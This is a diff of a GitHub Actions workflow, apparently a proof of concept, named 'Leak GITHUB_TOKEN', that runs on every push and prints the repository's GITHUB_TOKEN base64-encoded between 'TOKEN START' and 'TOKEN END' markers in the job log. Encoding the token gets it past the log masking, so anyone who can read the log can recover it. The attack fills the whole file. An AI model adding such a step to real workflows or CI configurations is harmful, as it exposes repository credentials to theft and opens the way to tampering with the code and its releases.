@@ -1,4 +1,4 @@
-name: RCE Leak PoC
+name: Leak GITHUB_TOKEN
 
 on: [push]
 
@@ -9,7 +9,8 @@ jobs:
       - name: Checkout
         uses: actions/checkout@v2
 
-      - name: Leak GitHub Token
+      - name: Dump GITHUB_TOKEN
         run: |
-          echo "Leaking GITHUB_TOKEN:"
+          echo "TOKEN START"
           echo "$GITHUB_TOKEN" | base64
+          echo "TOKEN END"
